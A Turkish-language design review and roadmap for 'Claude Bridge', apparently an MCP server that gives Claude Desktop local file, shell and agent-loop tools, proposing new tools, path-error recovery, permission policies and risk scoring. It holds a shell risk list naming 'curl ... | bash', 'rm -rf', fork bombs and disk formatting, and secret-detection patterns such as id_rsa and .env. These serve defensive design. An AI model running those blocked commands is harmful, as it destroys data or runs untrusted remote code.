Her test `set_config(...)` çağırıyor ve global `_CONFIG` dict'ini değiştiriyor. Testler şu an sıralı çalıştığı için sorun yok. Ama `pytest-xdist` ile paralel çalıştırılırsa race condition yaşanır. Yukarıdaki thread safety sorunuyla birleşince bu daha ciddi bir risk haline gelir.

**Öneri:** Her test için `_CONFIG`'i sıfırlayan bir `autouse` fixture ekle. Ya da `server.py` refactor edildiğinde config nesnesini dependency injection ile geçir.

### 24. End-to-End MCP Entegrasyon Testi Yok

Mevcut testler `mcp_server.*` fonksiyonlarını doğrudan çağırıyor. Gerçek bir MCP istemcisinin `tools/call` mesajı göndermesi ve JSON-RPC katmanının doğru çalışması test edilmiyor.

**Öneri:** MCP SDK'nın test utilities'i varsa bir smoke test ekle. Yoksa en azından `mcp.list_tools()` ve bir tool çağrısının tam yolunu test eden bir senaryo oluştur.

---

## 🟢 Projenin Gidebileceği Üç Yön

### Yön 1 — "Temizle ve Yayınla"
`suggestions.md`'deki acil maddeleri kapat, eksik temel araçları ekle (`write_file`, `search_in_files`), `server.py`'yi modüllere böl, GitHub'a yayınla. Bu, projeyi kullanılabilir açık kaynak araç haline getirir.

### Yön 2 — "İndeksi Gerçek Anlamda Zekileştir"
İndeksi diske kaydet, dosya değişikliklerini izle (`watchdog` kütüphanesi), daha fazla dil destekle (en azından TypeScript/JS). Bu, `find_relevant_files`'i gerçekten faydalı kılar ve projeyi "akıllı bridge" olarak konumlandırır.

### Yön 3 — "Agent Loop'u Olgunlaştır"
`run_agent_loop_session`'ı yapısal parametrelerle yeniden tasarla, her adımda git snapshot al, rollback tool ekle, iterasyon bütçesi aşıldığında Claude'a özet ver. Bu, projeyi güvenli otonom kodlama aracına doğru taşır.

Bu üç yön birbiriyle çelişmiyor ama sırayla gitmek daha sağlıklı. Yön 1 atlanmadan Yön 2 veya 3'e geçmek projeyi temelsiz büyütür.

---

## Güncellenmiş Öncelik Özeti

| Öncelik | Konu | Efor |
|---|---|---|
| 🔴 Acil | `prompt.py` import yan etkisi | Çok düşük |
| 🔴 Acil | Thread safety getter'lar | Düşük |
| 🔴 Acil | `write_file` / `search_in_files` eksikliği | Orta |
| 🔴 Acil | Approval sistemi yanıltıcılığı | Çok düşük (belge güncellemesi) |
| 🟠 Yakın | 30s yavaş test | Çok düşük |
| 🟠 Yakın | `PROGRESSION.md` tarih hatası | Çok düşük |
| 🟠 Yakın | `pyproject.toml` placeholder URL | Çok düşük |
| 🟠 Yakin | `archive/claude-bridge-plan.md` notu | Cok dusuk |
| 🟠 Yakın | `mcp_server_noapproval.py` kararı | Düşük |
| 🟠 Yakın | `steps_json: str` → yapısal parametre | Düşük |
| 🟠 Yakın | İndeks RAM'de full content | Orta |
| 🟠 Yakın | `_supplemental_review_targets` Godot'a gömülü | Orta |
| 🟡 Orta | `server.py` modüllere bölme | Yüksek |
| 🟡 Orta | `run_workflow` refactor | Orta |
| 🟡 Orta | `_resolve_path` asimetrisi | Düşük |
| 🟡 Orta | `language` parametresi tutarsızlığı | Düşük |
| 🟡 Orta | Git commit mesajı kalitesi | Düşük |
| 🟡 Orta | `test_bookmarklet.py` yeniden adlandırma | Çok düşük |
| 🟡 Orta | Test izolasyonu zayıflığı | Orta |
| 🟡 Orta | E2E MCP entegrasyon testi eksikliği | Orta |
| 🟡 Orta | İndeks diske kayıt yok | Orta |
| 🟢 Uzun | Shell allow-list yaklaşımı | Orta |
| 🟢 Uzun | Multi-language indeks desteği | Yüksek |
| 🟢 Uzun | Agent loop olgunlaştırma | Yüksek |
| 🟢 Uzun | `find_relevant_files` performans optimizasyonu | Düşük |

---

---

## 🔴 Tespit Edilen Aktif Hata: `path_outside_project` Sonrası Claude Erken Pes Ediyor

### 25. Claude "Erişimim Yok" Diyor Ama Aslında Var

**Gözlemlenen davranış:** Claude masaüstündeki bir dosyaya ya da başka bir proje klasörüne erişmeye çalıştığında başarısız olunca, "masaüstüne erişimim yok" diyerek konuşmayı bitiriyor. Oysa `switch_project_root` ile doğru dizine geçse erişimi olduğunu görürdü.

---

#### Kök Neden: Hata Yanıtı Boş ve Yönlendirmesiz

`read_file`, `list_directory` veya `patch_file` bir `path_outside_project` hatası ürettiğinde Claude'a dönen yanıt şu:

```json
{
  "ok": false,
  "message": "Access denied: path outside allowed roots",
  "code": "path_outside_project",
  "details": {
    "path": "/Users/keremdilker/Desktop/tertis/Player.gd"
  }
}
```

`details` içinde şunlar **yok:**
- Aktif proje dizininin ne olduğu
- Hangi root'lara izin verildiği
- Claude'un ne yapması gerektiğine dair en ufak ipucu

Claude bu boşluğu "erişimim yok" diyerek dolduruyor ve bırakıyor.

---

#### Sistem Promptu Neden Yetmiyor?

Sistem promptunda şu kural mevcut:

```
- If the requested files are in another project folder, call workspace_status()
  and then switch_project_root(path) before claiming access is unavailable.
```

Bu kural pasif bir talimat. Claude bir hata aldığında hata yanıtındaki bilgiyi bu kuralla bağdaştırmakta zorlanıyor. `path_outside_project` kodu geldiğinde "bu kodla ne yapacağım?" sorusuna yanıt yok.

---

#### Tutarsızlık: Aynı Hata Kodu, İki Farklı Bilgi Zenginliği

`switch_project_root` aynı hata kodunda çok daha bilgilendirici bir yanıt dönüyor:

```python
# switch_project_root içinde — allowed_roots var
details={"path": path, "allowed_roots": [...]}

# read_file ve list_directory içinde — sadece path var
details={"path": path}
```

Aynı `path_outside_project` kodu, farklı tool'larda farklı bilgi içeriyor. Bu tutarsızlık kendi başına da bir sorun.

---

#### Çözüm: İki Parça

**Parça 1 — `server.py`:** `read_file`, `list_directory` ve `patch_file`'daki `path_outside_project` yanıtına aktif proje dizini, izinli root'lar ve yönlendirici ipucu ekle:

```python
details={
    "path": path,
    "active_project_dir": str(_project_dir()),
    "allowed_roots": [str(root) for root in _allowed_roots()],
    "hint": (
        "Call workspace_status() to see available roots, "
        "then switch_project_root(path) to access another allowed directory, "
        "then retry the original operation."
    ),
}
```

**Parça 2 — `prompt.py`:** Sistem promptundaki kuralı pasif talimat olmaktan çıkarıp hata koduyla doğrudan tetiklenen bir akışa dönüştür:

```
Mevcut (pasif):
- If the requested files are in another project folder, call workspace_status()
  and then switch_project_root(path) before claiming access is unavailable.

Önerilen (aktif):
- When any tool returns code "path_outside_project", do NOT give up or claim
  access is unavailable. Immediately call workspace_status() to see what roots
  are allowed, call switch_project_root(path) to move to the right directory,
  then retry the original operation.
```

---

#### Neden Önemli?

Bu hata kullanıcıya "araç çalışmıyor" izlenimi veriyor. Oysa altyapı doğru kurulu, izinler tanımlı, dizin erişilebilir — sadece Claude hata yanıtından ne yapacağını çıkaramıyor. Düzeltmesi de düşük efor: iki dosyada birkaç satır.

| Alan | Değişiklik |
|---|---|
| `server.py` — `read_file` | `details`'e `active_project_dir`, `allowed_roots`, `hint` ekle |
| `server.py` — `list_directory` | Aynı |
| `server.py` — `patch_file` | Aynı |
| `prompt.py` — `SYSTEM_PROMPT` | Pasif kuralı aktif akışa dönüştür |

---

---

## Ürün Stratejisi: Claude Code Deneyimine Yaklaşmak ve Önüne Geçmek

Bu bölüm, Claude Bridge'in sadece "Claude Code benzeri" bir araç değil, kendi güçlü yönleri olan daha kontrollü, daha güvenli ve daha şeffaf bir yerel geliştirme katmanı haline nasıl getirilebileceğini açıklar.

Temel fikir şu olmalı:

> Claude Bridge, Claude Desktop için güvenli, local-first, policy-controlled coding agent layer olabilir.

Yani hedef yalnızca Claude Code'u taklit etmek değil; Claude Desktop üzerinde çalışan, açık kaynak, kontrol edilebilir, çoklu proje destekli ve güvenlik odaklı bir agent köprüsü inşa etmek olmalı.

---

## 26. Claude Code Hissi İçin Eksik Temel Araçlar

### Problem

Şu an proje şu temel tool'lara sahip:

- `read_file`
- `list_directory`
- `run_shell`
- `patch_file`
- `workspace_status`
- `switch_project_root`
- `index_codebase`
- `find_relevant_files`
- workflow ve agent loop yardımcıları

Bunlar iyi bir temel ama Claude Code deneyimi için yeterli değil. Claude Code hissi için Claude'un sadece mevcut dosyayı patch'lemesi değil, gerektiğinde yeni dosya oluşturması, arama yapması, klasör oluşturması, dosya taşıması ve değişiklikleri geri alması gerekir.

Şu an bu işlemler çoğunlukla `run_shell` üzerinden yapılmak zorunda kalır. Örneğin:

- Yeni dosya oluşturmak için `echo ... > file`
- Klasör oluşturmak için `mkdir -p`
- Arama yapmak için `grep` veya `rg`
- Dosya taşımak için `mv`
- Dosya silmek için `rm`

Bu hem güvenlik açısından kötü hem de MCP tool deneyimini zayıflatır.

### Önerilen Tool'lar

#### `write_file`

Yeni dosya oluşturmak veya küçük bir dosyanın tamamını yazmak için kullanılır.

Davranış:

- Path güvenlik kontrolünden geçmeli.
- Dosya zaten varsa varsayılan olarak hata vermeli.
- Üzerine yazma istenirse `overwrite=true` gibi açık parametre gerektirmeli.
- Yazmadan önce parent directory var mı kontrol etmeli.
- Python dosyası yazılıyorsa syntax kontrolü yapılabilir.
- Başarılı yazım sonrası git snapshot veya commit opsiyonel olmalı.

Önerilen parametreler:

- `path: str`
- `content: str`
- `overwrite: bool = False`
- `create_parents: bool = False`

Önerilen yanıt:

- `ok`
- `message`
- `details.path`
- `details.resolved_path`
- `details.bytes_written`
- `details.created`
- `details.overwritten`
- `details.git`

Öncelik: 🔴 Çok yüksek

---

#### `search_in_files`

Metin veya regex araması için kullanılır.

Davranış:

- Shell'e kaçmadan dosyaları Python içinde taramalı.
- `.gitignore` dikkate alınmalı.
- `venv`, `.git`, `node_modules`, cache klasörleri atlanmalı.
- Binary ve çok büyük dosyalar atlanmalı.
- Sonuç sayısı limitlenmeli.
- Regex opsiyonel olmalı.

Önerilen parametreler:

- `query: str`
- `path: str = "."`
- `regex: bool = False`
- `case_sensitive: bool = False`
- `include_glob: str | None = None`
- `limit: int = 50`

Önerilen yanıt:

- `ok`
- `message`
- `details.query`
- `details.results`
- Her result:
  - `path`
  - `line`
  - `column`
  - `preview`

Neden önemli?

Claude'un "bu fonksiyon nerede kullanılıyor?", "bu sabit nerede geçiyor?", "bu hata mesajı nereden geliyor?" gibi sorulara hızlı cevap bulmasını sağlar.

Öncelik: 🔴 Çok yüksek

---

#### `create_directory`

Yeni klasör oluşturmak için kullanılır.

Davranış:

- Path güvenlik kontrolü yapılmalı.
- `parents=true` ile parent klasörler oluşturulabilmeli.
- Var olan klasör için hata veya `already_exists` yanıtı dönmeli.

Önerilen parametreler:

- `path: str`
- `parents: bool = True`
- `exist_ok: bool = True`

Öncelik: 🟠 Yüksek

---

#### `move_file` / `rename_file`

Refactor ve dosya organizasyonu için kullanılır.

Davranış:

- Kaynak ve hedef path güvenlik kontrolünden geçmeli.
- Hedef varsa varsayılan olarak hata vermeli.
- Move sonrası git status veya commit bilgisi dönmeli.
- Directory move desteklenecekse ayrıca dikkat edilmeli.

Önerilen parametreler:

- `source: str`
- `destination: str`
- `overwrite: bool = False`

Öncelik: 🟠 Yüksek

---

#### `delete_file`

Dosya veya klasör silmek için kullanılır.

Davranış:

- Varsayılan sadece dosya silmeli.
- Klasör silmek için `recursive=true` açıkça istenmeli.
- Tehlikeli path'ler engellenmeli.
- Silmeden önce git snapshot alınmalı.
- Mümkünse doğrudan kalıcı silme yerine `.claude-bridge/trash` içine taşıma tercih edilmeli.

Önerilen parametreler:

- `path: str`
- `recursive: bool = False`
- `trash: bool = True`

Öncelik: 🟠 Yüksek

---

#### `preview_patch` veya `patch_file(dry_run=true)`

Patch uygulanmadan önce diff görmek için kullanılır.

Davranış:

- SEARCH/REPLACE eşleşmesini kontrol eder.
- Dosyayı değiştirmez.
- Unified diff üretir.
- Risk skoru dönebilir.
- Sonra `patch_file` ile uygulanabilir.

Önerilen parametreler:

- `file: str`
- `search: str`
- `replace: str`

Önerilen yanıt:

- `ok`
- `message`
- `details.diff`
- `details.matches`
- `details.risk`
- `details.lines_added`
- `details.lines_removed`

Öncelik: 🔴 Çok yüksek

---

#### `undo_last_patch`

Son Bridge değişikliğini geri almak için kullanılır.

Davranış:

- Eğer son patch git commit ürettiyse `git revert` veya checkout tabanlı geri alma önerir.
- Eğer commit başarısız olduysa internal snapshot varsa onu kullanır.
- Geri alma işlemi öncesi kullanıcıya hangi dosyaların etkileneceğini bildirir.

Önerilen parametreler:

- `confirm: bool = False`

Öncelik: 🔴 Çok yüksek

---

## 27. Path Recovery Akışı: Claude "Erişimim Yok" Dememeli

### Problem

Claude bir dosyaya erişemeyince hemen "masaüstüne erişimim yok" diyebiliyor. Oysa çoğu durumda erişim var; sadece aktif proje root'u yanlış veya Claude `switch_project_root` denememiş oluyor.

### Hedef Davranış

Herhangi bir tool şu hata kodunu döndürürse:

- `path_outside_project`

Claude otomatik olarak şu akışı izlemeli:

1. `workspace_status()` çağır.
2. `active_project_dir` ve `allowed_roots` alanlarını incele.
3. Hedef path izinli root'lardan birinin altındaysa `switch_project_root(path)` dene.
4. Başarılı olursa orijinal işlemi tekrar dene.
5. Ancak bundan sonra erişim olmadığını söyle.

### Nasıl Yapılır?

#### Server tarafı

`read_file`, `list_directory`, `patch_file`, ileride eklenecek `write_file`, `search_in_files`, `move_file` gibi tüm path tabanlı tool'lar `path_outside_project` hatasında standart bir details formatı dönmeli.

Standart error details:

- `path`
- `active_project_dir`
- `allowed_roots`
- `hint`
- `recommended_next_tools`

Örnek alanlar:

- `recommended_next_tools`: `["workspace_status", "switch_project_root"]`
- `hint`: "Call workspace_status(), switch to an allowed root if possible, then retry."

#### Prompt tarafı

Sistem promptuna doğrudan hata kodu bazlı kural eklenmeli:

- `path_outside_project` gördüğünde asla hemen erişim yok deme.
- Önce `workspace_status()` çağır.
- Gerekirse `switch_project_root()` dene.
- Sonra aynı işlemi tekrar dene.

### Neden Önemli?

Bu küçük düzeltme Claude Bridge deneyimini ciddi şekilde iyileştirir. Kullanıcı path verdiğinde Claude'un bunu çözmesini bekler. Kullanıcıdan workspace mantığını bilmesini beklemek Claude Code hissini bozar.

Öncelik: 🔴 Çok yüksek

---

## 28. Güvenli Agent Modu

### Amaç

Claude Bridge'in Claude Code'a en çok yaklaşacağı alan kontrollü agent loop'tur. Ama burada hedef "sınırsız otonomi" olmamalı. Hedef:

> Küçük, sınırlı, geri alınabilir ve doğrulanabilir agent adımları.

### Önerilen Mod

Yeni bir workflow veya tool:

- `run_safe_agent_task`

veya mevcut `run_agent_loop_session` iyileştirilerek kullanılabilir.

### Parametreler

- `goal: str`
- `target: str`
- `max_iterations: int = 3`
- `max_files_changed: int = 2`
- `max_lines_changed: int = 100`
- `allowed_commands: list[str]`
- `validation_command: str | None`
- `rollback_on_failure: bool = False`

### Akış

1. Hedef klasörü incele.
2. İlgili dosyaları bul.
3. İlk hipotezi oluştur.
4. En küçük patch'i hazırla.
5. Patch preview üret.
6. Patch'i uygula.
7. Validation komutunu çalıştır.
8. Başarılıysa dur.
9. Başarısızsa output'u analiz et.
10. İterasyon limiti dolmadıysa ikinci küçük patch'i dene.
11. Limit dolarsa özetle ve dur.

### Güvenlik Sınırları

Agent modunda şunlar zorunlu olmalı:

- Maksimum iterasyon
- Maksimum değiştirilecek dosya sayısı
- Maksimum değiştirilecek satır sayısı
- İzinli shell komut listesi
- Her adım öncesi snapshot
- Her adım sonrası diff
- Stop reason
- Final summary

### Stop Reason Örnekleri

- `validation_passed`
- `iteration_budget_exhausted`
- `patch_too_large`
- `too_many_files_changed`
- `unsafe_command_requested`
- `ambiguous_evidence`
- `user_approval_required`
- `rollback_recommended`

### Neden Claude Code'dan Farklılaşır?

Claude Code güçlü ama bazen fazla geniş hareket edebilir. Claude Bridge burada daha kontrollü bir deneyim sunabilir:

> "Otonom ama sınırları belli."

Bu özellikle güvenlik hassasiyeti olan kullanıcılar ve ekipler için avantaj olur.

Öncelik: 🟢 Uzun vadeli ama stratejik olarak çok değerli

---

## 29. Policy-Based Permission Sistemi

### Problem

Şu an izin sistemi temel olarak `project_dir` ve `allowed_roots` üstüne kurulu. Bu iyi bir başlangıç ama yeterince ayrıntılı değil.

Bir projede bazı dosyalar okunabilir ama değiştirilemez olmalı. Bazı komutlar çalıştırılabilir, bazıları yasak olmalı. Bazı klasörler tamamen gizlenmeli.

### Öneri

Proje kökünde opsiyonel bir policy dosyası kullanılabilir:

- `claude-bridge.policy.json`

Bu dosya Bridge'in davranışını proje bazında belirler.

### Policy İçeriği

Örnek alanlar:

- `read_allow`
- `read_deny`
- `write_allow`
- `write_deny`
- `shell_allow`
- `shell_deny`
- `protected_files`
- `secret_patterns`
- `max_patch_lines`
- `max_files_per_patch`
- `auto_approve_low_risk`
- `validation_commands`

### Örnek Kurallar

- `src/**` okunabilir ve değiştirilebilir.
- `tests/**` okunabilir ve değiştirilebilir.
- `.env` okunamaz.
- `secrets/**` okunamaz.
- `dist/**` değiştirilemez.
- `git push` çalıştırılamaz.
- `npm publish` çalıştırılamaz.
- `pytest` çalıştırılabilir.
- `ruff check .` çalıştırılabilir.

### Nasıl Uygulanır?

1. Config yüklenirken policy dosyası aranır.
2. Varsa parse edilir.
3. Her tool çağrısında path veya command policy'den geçirilir.
4. İhlal varsa standart `policy_denied` hatası dönülür.
5. Hata details içinde hangi kuralın engellediği yazılır.

### Yeni Hata Kodu

- `policy_denied`

Önerilen details:

- `operation`
- `path` veya `command`
- `matched_rule`
- `policy_file`
- `hint`

### Neden Önemli?

Bu özellik Claude Bridge'i bireysel oyuncak olmaktan çıkarıp takım ve ciddi proje kullanımına yaklaştırır. Ayrıca "güvenli Claude Desktop coding layer" konumlandırmasını güçlendirir.

Öncelik: 🟢 Uzun vadeli, yüksek değerli

---

## 30. Framework-Aware Intelligence

### Problem

Şu an `_supplemental_review_targets` Godot dosyalarına özel bakıyor. Bu yaklaşım genişletilmezse proje farklı ekosistemlerde zayıf kalır.

### Öneri

Bridge proje türünü otomatik algılamalı ve ona göre ek bağlam toplamalı.

### Framework Algılama

Yeni bir yardımcı fonksiyon:

- `detect_project_type(path=".")`

Dönebileceği türler:

- `python_package`
- `django`
- `fastapi`
- `node`
- `react`
- `vite`
- `nextjs`
- `rust`
- `go`
- `godot`
- `unknown`

### Algılama Sinyalleri

Godot:

- `project.godot`
- `*.tscn`
- `export_presets.cfg`

Python:

- `pyproject.toml`
- `requirements.txt`
- `setup.py`
- `tests/`

Django:

- `manage.py`
- `settings.py`
- `urls.py`

Node:

- `package.json`
- `node_modules`
- `tsconfig.json`

React/Vite:

- `vite.config.*`
- `src/App.*`
- `src/main.*`

Rust:

- `Cargo.toml`
- `src/main.rs`
- `src/lib.rs`

Go:

- `go.mod`
- `main.go`

### Ne İşe Yarar?

Framework algılandıktan sonra Bridge şunları daha iyi yapabilir:

- Doğru entrypoint dosyalarını okur.
- Doğru validation komutunu önerir.
- İlgili config dosyalarını context'e ekler.
- Claude'a framework-specific uyarılar verir.
- `run_workflow(..., execute=true)` daha kaliteli keşif yapar.

### Örnek

Godot projesinde:

- Script okununca scene dosyaları da önerilir.
- `project.godot` kontrol edilir.
- `export_presets.cfg` kontrol edilir.

Python projesinde:

- `pyproject.toml` okunur.
- `tests/` var mı bakılır.
- `python -m pytest` önerilir.

Node projesinde:

- `package.json` okunur.
- `npm test`, `pnpm test` veya `yarn test` script'i bulunur.
- `tsconfig.json` varsa TypeScript context'e eklenir.

Öncelik: 🟡 Orta vadeli, yüksek ürün değeri

---

## 31. Context Pack Builder

### Problem

Claude çoğu zaman göreve başlamadan önce hangi dosyaları okuması gerektiğini bilemez. `find_relevant_files` yardımcı oluyor ama tek başına yeterli değil.

### Öneri

Yeni bir tool:

- `build_context_pack(target, goal)`

Bu tool verilen hedef ve göreve göre Claude için hazır bir bağlam paketi oluşturur.

### Context Pack İçeriği

- En alakalı kaynak dosyalar
- İlgili test dosyaları
- Framework config dosyaları
- Entry point'ler
- Son git diff
- README'den ilgili bölümler
- Paket yöneticisi bilgisi
- Önerilen validation komutları
- Riskli alanlar
- Okunması önerilen dosyalar

### Parametreler

- `target: str = "."`
- `goal: str`
- `max_files: int = 8`
- `include_tests: bool = True`
- `include_git_diff: bool = True`
- `include_docs: bool = True`

### Yanıt

- `project_type`
- `selected_files`
- `test_files`
- `config_files`
- `validation_commands`
- `git_status`
- `risk_notes`
- `next_recommended_tools`

### Nasıl Yapılır?

1. `detect_project_type` çağır.
2. `index_codebase` veya internal index kullan.
3. `find_relevant_files` ile hedefe uygun dosyaları bul.
4. Framework'e göre config dosyalarını ekle.
5. Test dosyalarını heuristic ile bul.
6. `git diff --name-only` benzeri güvenli git komutları ile değişen dosyaları ekle.
7. Sonuçları tek JSON response olarak döndür.

### Neden Önemli?

Bu özellik Claude'un "tahmin etme" ihtiyacını azaltır. Claude Code hissinde en kritik şeylerden biri doğru context'i hızlı toplamaktır. Context pack bunu sistematik hale getirir.

Öncelik: 🟡 Orta vadeli, çok değerli

---

## 32. Project Doctor

### Amaç

Bridge sadece kod değiştiren araç değil, projeyi analiz eden bir kalite asistanı da olabilir.

Yeni tool:

- `project_doctor(path=".")`

### Ne Yapar?

Projeyi inceler ve sağlık raporu üretir.

Kontrol alanları:

- Test klasörü var mı?
- Test komutu bulunabiliyor mu?
- README var mı?
- `.gitignore` yeterli mi?
- `.env` veya secret dosyaları repoya girebilir mi?
- `pyproject.toml` / `package.json` / `Cargo.toml` tutarlı mı?
- Lisans var mı?
- CI config var mı?
- Büyük dosya veya binary var mı?
- Kişisel path sızıntısı var mı?
- Yayın checklist'i eksik mi?
- Git status temiz mi?

### Yanıt

- `health_score`
- `project_type`
- `critical_issues`
- `warnings`
- `suggestions`
- `quick_wins`
- `publish_readiness`
- `recommended_next_actions`

### Neden Claude Code'un Önüne Geçebilir?

Claude Code genelde verilen işi yapmaya odaklanır. Project Doctor ise projenin genel sağlığını değerlendirir. Bu, Bridge'e ürün olarak farklı bir değer verir:

> "Sadece kod yazmıyor; projenin yayınlanabilirliğini ve güvenliğini de denetliyor."

Öncelik: 🟢 Uzun vadeli ama güçlü farklılaştırıcı

---

## 33. Patch Risk Skoru

### Problem

Şu an `patch_file` patch'i uygular veya hata döndürür. Ama patch'in risk seviyesi hakkında bilgi vermez.

### Öneri

Patch uygulanmadan önce veya dry-run sırasında risk skoru hesaplanmalı.

Yeni alanlar:

- `risk_level`: `low`, `medium`, `high`
- `risk_reasons`
- `lines_added`
- `lines_removed`
- `files_touched`
- `touches_tests`
- `touches_config`
- `touches_secrets`
- `large_deletion`
- `public_api_change_possible`

### Risk Örnekleri

Low risk:

- Tek dosya
- 5 satırdan az değişiklik
- Test dosyası veya küçük bug fix
- Config yok
- Secret yok

Medium risk:

- 2-3 dosya
- 50 satıra kadar değişiklik
- Config dosyası etkileniyor
- Test yok

High risk:

- Çok dosya
- Büyük silme
- `.env`, credential, key dosyaları
- Build/deploy config
- Public API değişikliği
- Migration dosyaları

### Nerede Kullanılır?

- `preview_patch`
- `patch_file`
- `run_agent_loop_step`
- `run_safe_agent_task`

### Neden Önemli?

Kullanıcı patch'i uygulamadan önce riskini görür. Bu, güven hissini artırır ve Claude Bridge'i "güvenli agent" olarak konumlandırır.

Öncelik: 🟡 Orta vadeli

---

## 34. Shell Command Risk Skoru

### Problem

Şu an shell güvenliği blocklist ile sağlanıyor. Bazı tehlikeli pattern'ler engelleniyor ama tüm riskler kapsanamaz.

### Öneri

Her shell komutuna risk skoru verilmeli.

Risk seviyeleri:

- `low`
- `medium`
- `high`
- `blocked`

Low risk örnekleri:

- `pytest`
- `python -m pytest`
- `git status`
- `git diff`
- `ruff check .`
- `ls`

Medium risk örnekleri:

- `pip install`
- `npm install`
- `python script.py`
- `git checkout`

High risk örnekleri:

- `git reset --hard`
- `git clean -fd`
- `rm`
- `curl`
- `wget`
- `ssh`
- `scp`
- `npm publish`

Blocked örnekleri:

- `sudo`
- `rm -rf`
- `chmod 777`
- `curl ... | bash`
- fork bomb pattern'leri
- disk formatlama komutları

### Yanıt Formatı

`run_shell` çalışmadan önce veya dry-run modunda şunları dönebilir:

- `risk_level`
- `risk_reasons`
- `requires_confirmation`
- `blocked_pattern`
- `safer_alternative`

### Ek Tool

- `analyze_shell_command(command)`

Bu tool komutu çalıştırmadan risk analizi yapar.

Öncelik: 🟡 Orta vadeli

---

## 35. Local Web Approval UI

### Problem

Claude Desktop MCP approval davranışı sınırlı olabilir. Server tarafında `input()` kullanmak stdio kanalını bozabilir. Bu yüzden approval deneyimi net değil.

### Öneri

Claude Bridge opsiyonel lokal web UI sunabilir.

Adres:

- `http://localhost:7337`

Bu UI sadece local çalışır.

### UI Özellikleri

- Pending patch listesi
- Unified diff görünümü
- Shell command risk açıklaması
- Approve / Reject butonları
- Session log
- Son değişiklikler
- Rollback butonu
- Active workspace görüntüsü
- Allowed roots listesi

### Akış

1. Claude `patch_file` veya `run_shell` çağırır.
2. Tool yanıtı `approval_required` döner.
3. Web UI'da pending action görünür.
4. Kullanıcı onaylar veya reddeder.
5. Claude aynı action id ile `continue_approved_action(action_id)` çağırır.

### Gerekli Tool'lar

- `list_pending_actions`
- `approve_action`
- `reject_action`
- `continue_approved_action`
- `cancel_action`

### Neden Önemli?

Bu, Claude Bridge'i ciddi bir ürüne yaklaştırır. Kullanıcı tam olarak neyin çalışacağını ve neyin değişeceğini görür.

Öncelik: 🟢 Uzun vadeli, yüksek UX değeri

---

## 36. Workspace Profiles

### Problem

Şu an allowed roots var ama proje bazlı kalıcı profil yok. Her proje için test komutları, framework tipi, policy, son kullanılan dosyalar ve index ayrı tutulmuyor.

### Öneri

Workspace profil sistemi eklenebilir.

Her workspace için:

- `name`
- `root_path`
- `project_type`
- `default_validation_commands`
- `policy_file`
- `index_cache_path`
- `recent_files`
- `last_session_summary`
- `preferred_language`
- `auto_approve_policy`

### Tool'lar

- `list_workspaces`
- `add_workspace`
- `remove_workspace`
- `switch_workspace`
- `workspace_profile`
- `update_workspace_profile`

### Nerede Saklanır?

Global kullanıcı config'i:

- `~/.claude-bridge/workspaces.json`

Proje içi config:

- `.claude-bridge/workspace.json`

### Neden Önemli?

Claude Desktop içinde birden fazla proje ile çalışmak Bridge'in doğal avantajı olabilir. Claude Code genellikle tek terminal/proje hissi verirken Bridge çoklu workspace merkezi olabilir.

Öncelik: 🟢 Uzun vadeli

---

## 37. Otomatik Validation Planı

### Problem

Claude çoğu zaman "test çalıştıralım" der ama hangi komutun doğru olduğunu bilmez.

### Öneri

Yeni tool:

- `suggest_validation_commands(target=".")`

Zaten internal `_suggest_validation_commands` var. Bu public MCP tool haline getirilebilir ve framework-aware yapılabilir.

### Framework Bazlı Örnekler

Python:

- `python -m pytest`
- `ruff check .`
- `python -m mypy .`

Node:

- `npm test`
- `npm run lint`
- `npm run typecheck`

pnpm:

- `pnpm test`
- `pnpm lint`
- `pnpm typecheck`

Rust:

- `cargo test`
- `cargo clippy`

Go:

- `go test ./...`

Godot:

- `git diff`
- varsa headless test komutu

### Daha Gelişmiş Tool

- `run_validation_plan(target=".")`

Bu tool güvenli validation komutlarını sırayla çalıştırır ve özet döner.

### Neden Önemli?

Agent loop'un kaliteli çalışması için validation şarttır. Validation planı olmadan agent kör ilerler.

Öncelik: 🟡 Orta vadeli

---

## 38. Session Memory ve Compact Summary

### Problem

Uzun görevlerde Claude hangi dosyaları okuduğunu, hangi patch'leri attığını ve hangi testleri çalıştırdığını unutabilir veya context şişebilir.

### Öneri

Bridge session bazlı hafif state tutabilir.

Tutulacak bilgiler:

- Son okunan dosyalar
- Son listelenen dizinler
- Son shell komutları
- Son patch'ler
- Son validation sonucu
- Aktif hedef
- Aktif workspace
- Son hata
- Son önerilen next action

### Tool'lar

- `session_status`
- `session_summary`
- `compact_session_context`
- `clear_session`

### Yanıt

`compact_session_context` şunu dönebilir:

- Görev hedefi
- Okunan dosyalar
- Yapılan değişiklikler
- Çalıştırılan komutlar
- Başarılı/başarısız validation
- Kalan riskler
- Önerilen sonraki adım

### Neden Önemli?

Bu, agent loop ve uzun review görevlerinde context yönetimini iyileştirir. Claude'un aynı dosyayı tekrar tekrar okumasını azaltır.

Öncelik: 🟡 Orta vadeli

---

## 39. Secret Scanner ve Privacy Guard

### Problem

Yerel dosya erişimi güçlü ama risklidir. Claude yanlışlıkla `.env`, private key, token veya kişisel path içeren dosyaları okuyabilir ya da patch'e dahil edebilir.

### Öneri

Bridge içinde privacy guard katmanı olmalı.

Kontrol edilecek pattern'ler:

- `API_KEY`
- `SECRET`
- `TOKEN`
- `PASSWORD`
- `.env`
- `.pem`
- `.key`
- `id_rsa`
- AWS credentials
- GitHub token pattern'leri
- `/Users/...` kişisel path'ler

### Tool Davranışı

`read_file`:

- Hassas dosya ise engeller veya redacted içerik döner.

`patch_file` / `write_file`:

- Secret ekleniyor gibi görünüyorsa uyarı verir.
- Policy'ye göre engelleyebilir.

`project_doctor`:

- Secret leakage taraması yapar.

### Yanıt

- `code: "sensitive_file_blocked"`
- `code: "secret_pattern_detected"`
- `details.patterns`
- `details.hint`

### Neden Önemli?

Bu, Claude Bridge'in güvenlik odaklı konumlandırmasını güçlendirir.

Öncelik: 🔴 Güvenlik için yüksek

---

## 40. Önerilen Yol Haritası

### Aşama 1 — Claude Code Hissi İçin Temel Eksikler

Amaç: Claude'un dosya sistemi üzerinde doğal çalışabilmesi.

Yapılacaklar:

1. `write_file`
2. `search_in_files`
3. `create_directory`
4. `move_file`
5. `delete_file`
6. `preview_patch` / `dry_run`
7. `undo_last_patch`
8. `path_outside_project` recovery fix

Bu aşama tamamlandığında Claude dosya sisteminde çok daha rahat hareket eder.

---

### Aşama 2 — Güven ve Kontrol

Amaç: Kullanıcının "bozarsa geri alırım" güvenini kazanmak.

Yapılacaklar:

1. Approval davranışını belge ve gerçek hale getir.
2. Patch risk skoru ekle.
3. Shell command risk skoru ekle.
4. Secret scanner ekle.
5. Policy dosyası tasarla.
6. Diff preview zorunlu opsiyon yap.
